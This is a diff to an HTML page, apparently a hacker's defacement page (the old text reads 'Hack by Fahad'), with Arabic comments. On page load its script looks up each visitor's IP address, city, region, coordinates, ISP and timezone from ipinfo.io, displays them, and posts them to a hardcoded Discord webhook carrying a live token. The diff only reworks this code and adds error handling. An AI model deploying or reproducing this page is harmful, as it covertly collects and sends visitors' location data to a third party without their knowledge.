@@ -6,6 +6,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>5 1 1</title>
 <style>
+
+
+  
     body {
         margin: 0;
         padding: 0;
@@ -109,6 +112,7 @@
                     0px 0px 25px rgba(255, 0, 0, 0.5);
         letter-spacing: 4.5px;
         white-space: pre-wrap;
+        z-index: 55555555555555;
     }
 
     /* شريط النص المتحرك داخل الفيديو الثاني */
@@ -141,7 +145,7 @@
 </style>
 </head>
 <body>
-
+<canvas id="canvas"></canvas>
 <!-- الفيديو الأول -->
 <video class="background-video" autoplay muted>
     <source src="https://a.top4top.io/m_3478g2jbe1.mp4" type="video/mp4">
@@ -249,42 +253,59 @@
     };
 
     // Fetch IP information without API token
-    fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            const { ip, country, city, region, loc, org, timezone } = data;
+fetch('https://ipinfo.io/json')
+  .then(response => {
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    return response.json();
+  })
+  .then(data => {
+    const { ip, country, city, region, loc, org, timezone } = data;
 
-            // تحديد البورت بناءً على البروتوكول
-            const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
+    const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
 
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = ` Hack by Fahad
-<strong>IP:</strong><span>"${ip}"</span><br>
-<strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
-<strong>City:</strong><span>"${city}"</span><br>
-<strong>Region:</strong><span>"${region}"</span><br>
-<strong>Country:</strong><span>"${country}"</span><br>
-<strong>Location:</strong><span>"${loc}"</span><br>
-<strong>ISP:</strong><span>"${org}"</span><br>
-<strong>Timezone:</strong><span>"${timezone}"</span>`;
+    const infoDiv = document.getElementById('ip-info');
+    if (!infoDiv) {
+      console.error("عنصر #ip-info غير موجود في الصفحة!");
+      return;
+    }
 
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `⚠️ **5 1 1** ⚠️\n\n` +
-                             `**IP:** \`${ip}\`\n` +
-                             `**Port:** \`${port}\`\n` +
-                             `**Location:** ${country} - ${city}\n` +
-                             `**Coordinates:** ${loc}\n` +
-                             `**ISP:** ${org}\n` +
-                             `**Time:** ${dateTime}`
-                })
-            });
-        });
+    infoDiv.innerHTML = `
+<strong>IP:</strong> ${ip}<br>
+<strong>Port:</strong> ${port}<br>
+<strong>City:</strong> ${city}<br>
+<strong>Region:</strong> ${region}<br>
+<strong>Country:</strong> ${country}<br>
+<strong>Location:</strong> ${loc}<br>
+<strong>ISP:</strong> ${org}<br>
+<strong>Timezone:</strong> ${timezone}
+`;
+
+    const dateTime = new Date().toLocaleString();
+    const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        content: `⚠️ **5 1 1** ⚠️\n\n` +
+                 `**IP:** \`${ip}\`\n` +
+                 `**Port:** \`${port}\`\n` +
+                 `**Location:** ${country} - ${city}\n` +
+                 `**Coordinates:** ${loc}\`\n` +
+                 `**ISP:** ${org}\`\n` +
+                 `**Time:** ${dateTime}`
+      })
+    }).then(res => {
+      if (!res.ok) console.error("فشل إرسال البيانات إلى الديسكورد");
+    }).catch(err => console.error("خطأ في إرسال الديسكورد:", err));
+
+  })
+  .catch(err => {
+    console.error("خطأ في جلب بيانات IP:", err);
+    const infoDiv = document.getElementById('ip-info');
+    if (infoDiv) infoDiv.textContent = 'تعذر تحميل معلومات IP';
+  });
+
 </script>
 
 <!-- فتح نوافذ Discord تلقائيًا -->
